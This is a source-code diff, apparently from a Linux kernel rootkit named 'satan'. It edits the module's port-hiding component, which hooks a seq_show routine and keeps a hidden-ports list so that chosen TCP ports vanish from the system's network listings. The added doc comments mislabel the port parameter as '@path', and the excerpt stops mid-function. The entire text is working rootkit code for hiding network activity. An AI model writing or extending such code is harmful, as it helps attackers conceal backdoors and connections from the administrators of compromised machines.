@@ -36,7 +36,7 @@ static int satan_seq_show(struct seq_file *seq, void *v);
 
 int satan_port_init(void)
 {
-        return satan_port_hook_seq_show() == 0;
+        return satan_port_hook_seq_show();
 }
 
 void satan_port_exit(void)
@@ -46,37 +46,75 @@ void satan_port_exit(void)
 }
 
 
-
+/**
+ * satan_port_hide() - Hides a TCP and UDP port.
+ * @path: the port number.
+ *
+ * Return: zero on success and non-zero otherwise.
+ */
 int satan_port_hide(unsigned int port_num)
 {
-        return satan_port_tcp_hide(port_num) == 0 &&
-               satan_port_udp_hide(port_num) == 0;
+        int ret = 0;
+        ret += satan_port_tcp_hide(port_num);
+        ret += satan_port_udp_hide(port_num);
+        return ret;
 }
 
+/**
+ * satan_port_unhide() - Unhides a TCP and UDP port.
+ * @path: the port number.
+ *
+ * Return: zero on success and non-zero otherwise.
+ */
 int satan_port_unhide(unsigned int port_num)
 {
-        return satan_port_tcp_unhide(port_num) == 0 &&
-               satan_port_udp_unhide(port_num) == 0;
+        int ret = 0;
+        ret += satan_port_tcp_unhide(port_num);
+        ret += satan_port_udp_unhide(port_num);
+        return ret;
 }
 
 
-
+/**
+ * satan_port_tcp_hide() - Hides a TCP port.
+ * @path: the port number.
+ *
+ * Return: zero on success and non-zero otherwise.
+ */
 int satan_port_tcp_hide(unsigned int port_num)
 {
-        return hidden_ports_list_add(port_num) == 0;
+        return hidden_ports_list_add(port_num);
 }
 
+/**
+ * satan_port_tcp_unhide() - Unhides a TCP port.
+ * @path: the port number.
+ *
+ * Return: zero on success and non-zero otherwise.
+ */
 int satan_port_tcp_unhide(unsigned int port_num)
 {
-        return hidden_ports_list_del(port_num) == 0;
+        return hidden_ports_list_del(port_num);
 }
 
+/**
+ * satan_port_udp_hide() - Hides a UDP port.
+ * @path: the port number.
+ *
+ * Return: zero on success and non-zero otherwise.
+ */
 int satan_port_udp_hide(unsigned int port_num)
 {
         // Not implemented yet.
         return 0;
 }
 
+/**
+ * satan_port_udp_unhide() - Unhides a UDP port.
+ * @path: the port number.
+ *
+ * Return: zero on success and non-zero otherwise.
+ */
 int satan_port_udp_unhide(unsigned int port_num)
 {
         // Not implemented yet.
